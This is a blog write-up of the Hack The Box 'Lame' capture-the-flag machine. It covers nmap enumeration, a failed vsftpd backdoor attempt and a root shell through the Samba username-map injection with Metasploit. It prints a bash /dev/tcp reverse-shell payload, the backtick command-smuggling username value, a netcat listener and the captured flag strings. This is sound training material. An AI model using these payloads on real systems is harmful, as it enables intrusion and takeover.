Title: Hack The Box: Lame
Date: 2023-01-02
Category: Blog
Tags: Cybersecurity, Hack The Box, Infosec
Author: Matt Spraggs

I've been doing a lot of [Hack The Box](https://www.hackthebox.com/) lately. For
those who don't know, Hack The Box (HTB) is a playground for would-be hackers to
test their skills against machines with various security vulnerabilities. The
point isn't to use these skills for nefarious or illegal purposes. Instead, the
aim is to train people to think more critically about potential security
weaknesses in software so that they can design and implement systems with
security in mind. Each machine on HTB has a digital flag (typically a file on
the machine containing some secret string) that the hacker must capture. This
type of set up is called
[capture the flag](https://en.wikipedia.org/wiki/Capture_the_flag_(cybersecurity)),
or CTF.

Newcomers to HTB can start with the Starting Point machines to familiarise
themselves with the CTF process. Generally speaking, gaining admin privileges on
a target machine is achieved in three stages:

1. Enumeration - determining the services the target is running and whether they
   are vulnerable.
2. Getting a foothold - using the results of stage 1 to get access to the
   target.
3. Privilege escalation - using vulnerabilities within the target machine to
   gain root or superuser privileges on the machine.

Having completed the Starting Point machines, I turned my attention to the
Beginner Track. The first machine I attempted was called Lame. The rest of this
article will be a summary of how I captured the flags on this machine.

# Enumeration

The first tool I turn to when enumerating a remote machine is
[Nmap](https://nmap.org/). Nmap is a port and IP scanner used to detect which
ports and services are open and running on a target machine or set of machines.

Having aliased the IP of Lame to lame.htb using my `/etc/hosts` file, I pointed
Nmap at the target machine:

```shell
$ nmap -A -Pn lame.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-16 18:03 GMT
Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 18:04 (0:00:00 remaining)
Nmap scan report for lame.htb (10.129.31.208)
Host is up (0.014s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.78
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h30m28s, deviation: 3h32m10s, median: 26s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-11-16T13:04:15-05:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.51 seconds
```

The `-Pn` flag tells Nmap to skip host detection. By default Nmap will try to
determine whether the target is online. This flag tells it to skip that step and
assume the target is there and available. The `-A` flag instructs Nmap to try
to determine which OS and service versions are running on the target, amongst
other things. There are other flags that give this info, but `-A` also provides
service-specific details in the output. It's an aggressive scan option that
could alert sysadmins to our attack in a real-life scenario, but there's no harm
in using it here.

There are a few things to pore over in the results. The target has three
services running on four ports:

* FTP running on port 21, provided by vsftpd version 2.3.4.
* SSH running on port 22, provided by OpenSSH version 4.7p1.
* SMB running on ports 139 and 445, provided by Samba version 3.0.20.

We can use this information to determine whether any of these services contain
known vulnerabilities. If one of these vulnerabilities is exploitable, that will
give us our foothold.

# Foothold

With the version information in hand, I set about determining whether there were
any known vulnerabilities in the three services above.

## Dead End: vsftpd

Googling "vsftpd 2.3.4 exploit" took me to
[CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523). This version of
vsftpd contains a backdoor. The backdoor opens a remote shell on port 6200
whenever a user logs in with a colon in their username.

I used [netcat](https://en.wikipedia.org/wiki/Netcat) to try and and open this
backdoor on the target:

```shell
$ nc lame.htb 21
220 (vsFTPd 2.3.4)
USER foo:)
331 Please specify the password.
foo
530 Please login with USER and PASS.
USER foo:)
331 Please specify the password.
PASS foo

```

Then, in a second session, I reran Nmap to check for the backdoor on port 6200:

```shell
$ nmap -Pn lame.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-16 18:23 GMT
Nmap scan report for lame.htb (10.129.31.208)
Host is up (0.014s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 4.77 seconds
```

No joy. Port 6200 isn't available, suggesting the backdoor wasn't activated.

To make certain, I also tried using the `unix/ftp/vsftpd_234_backdoor` module in
metasploit, without success.

## Samba

Next on my list was Samba 3.0.20. Googling for CVEs turned up
[CVE-2007-2447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2007-2447).
This is a remote code execution (RCE) vulnerability, meaning it allows an
attacker to execute arbitrary commands on the target machine. These kinds of
vulnerabilities are particularly devastating because they allow an attacker to
poke around the target, modify files and potentially even gain an interactive
shell.

Samba is a free and open source implementation of the
[Server Message Block](https://en.wikipedia.org/wiki/Server_Message_Block) (SMB)
protocol. SMB is a protocol for sharing files and printers over networks. It's
commonly used in corporate environments, where the network usually consists of
predominantly Windows PCs.

In the port scan above, Samba is listening on two ports. The first, 139, is the
[NetBIOS](https://en.wikipedia.org/wiki/NetBIOS) session port, NetBIOS being the
original API SMB used to manage client sessions. Port 445 was added to the
protocol later and allows clients to use SMB without NetBIOS.

In brief, CVE-2007-2447 exists as a result of how Samba 3.0.20 implements MS-RPC
requests. MS-RPC is a remote procedure call (RPC) protocol developed by
Microsoft. Samba 3.0.20 provides an option in its configuration file,
`smb.conf`, that allows a username map script to be configured. For example:

```text
username map script = /etc/samba/scripts/mapusers.sh
```

This script is called by the Samba daemon with the username of the user trying
to authenticate. Internally, the daemon makes a call to `sh -c`, passing the
script and the username as input. By selecting an appropriate value for the
username, arbitrary code can be executed on the target machine. Specifically,
setting ``username = "/=`nohup <command>`"`` when authenticating with Samba will
result in `<command>` being run on the target.

The most effective command to use in this sort of scenario is a reverse shell.
This essentially means that we make the target issue a network request _back_ to
us in such a way that we get an interactive shell on the target. A typical
payload to achieve this would look like

```shell
bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1
```

There's a fair bit of Unix piping going on here, but all this is really doing is
starting bash in interactive mode (N.B. the `-i` flag) and piping _all_ the
output of that to a TCP socket connecting the target to the attacker's IP and
port. The socket here is bidirectional, so the payload includes the `0>&1` pipe
to ensure that the terminal's standard input is also linked to this socket.

As the attacker, we would then listen for this connection using netcat, for
example:

```shell
$ nc -nlvp <attacker_port>
```

The target then runs the payload command, providing the attacker (us) with an
interactive shell.

At this point I confess I got a little lazy and just pulled out the
`multi/samba/usermap_script` exploit module in Metasploit:

```shell
$ msfconsole

... Metasploit spits out a load of ASCII art/version stuff here that I'll leave out ...

[msf](Jobs:0 Agents:0) >> use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
```

I found I had limited success with the default payload (a reverse shell spawned
with netcat). Instead I loaded `cmd/unix/reverse`, which uses `telnet` to
construct a _double_ reverse shell.

```shell
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set PAYLOAD cmd/unix/reverse
PAYLOAD => cmd/unix/reverse
```

Metasploit lets us view the options for the loaded exploit:

```shell
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/U
                                      sing-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  157.245.41.35    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


```

Metasploit has configured a few of these options for us, but we need to provide
the rest and change some of the defaults:

* The value for `RHOSTS` will be the hostname of the machine we're attacking,
  i.e. `lame.htb`.
* The `LHOST` value is the IP of the interface on our machine. It's used by the
  payload to construct the reverse shell. The default value is taken from the
  wrong network interface, so we'll have to update that.
* Finally, the value of `LPORT`, 4444, is not 1337 enough, so we'll need to
  change that...

```shell
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set RHOSTS lame.htb
RHOSTS => lame.htb
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set LHOST 10.10.14.78
LHOST => 10.10.14.78
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set LPORT 1337
LPORT => 1337
```

The stage is set. Let's run it!

```shell
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> exploit

[*] Started reverse TCP double handler on 10.10.14.78:1337 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 3Af1GRKylXvb0aCv;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "3Af1GRKylXvb0aCv\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.78:1337 -> 10.129.31.208:39912) at 2022-11-16 21:56:05 +0000

whoami
root
```

Boom 💥 We're in! We're already the root user, so we don't even need to
escalate privileges. Now we just need to find the flags.

# Flags

Now we have root, obtaining the various flags is straightforward:

```shell
$ cat /root/root.txt
74626852c89d17e3d435b51c2390b333
$ find /home
/home
/home/service
/home/service/.profile
/home/service/.bashrc
/home/service/.bash_logout
/home/ftp
/home/makis
/home/makis/user.txt
/home/makis/.profile
/home/makis/.sudo_as_admin_successful
/home/makis/.bash_history
/home/makis/.bashrc
/home/makis/.bash_logout
/home/user
/home/user/.ssh
/home/user/.ssh/id_dsa.pub
/home/user/.ssh/id_dsa
/home/user/.profile
/home/user/.bash_history
/home/user/.bashrc
/home/user/.bash_logout
$ cat /home/makis/user.txt
94a567fa12225e2394a1d4c1b0fcce17
```

And that's it. We now have two flags:

* Root user - `74626852c89d17e3d435b51c2390b333`,
* Makis user - `94a567fa12225e2394a1d4c1b0fcce17`.

And we're done.

This is what I hope to be the first of several HTB write-ups. I'm steadily
working my way through the Beginner Track machines. As I complete them I'll
write them up here, so watch this space.
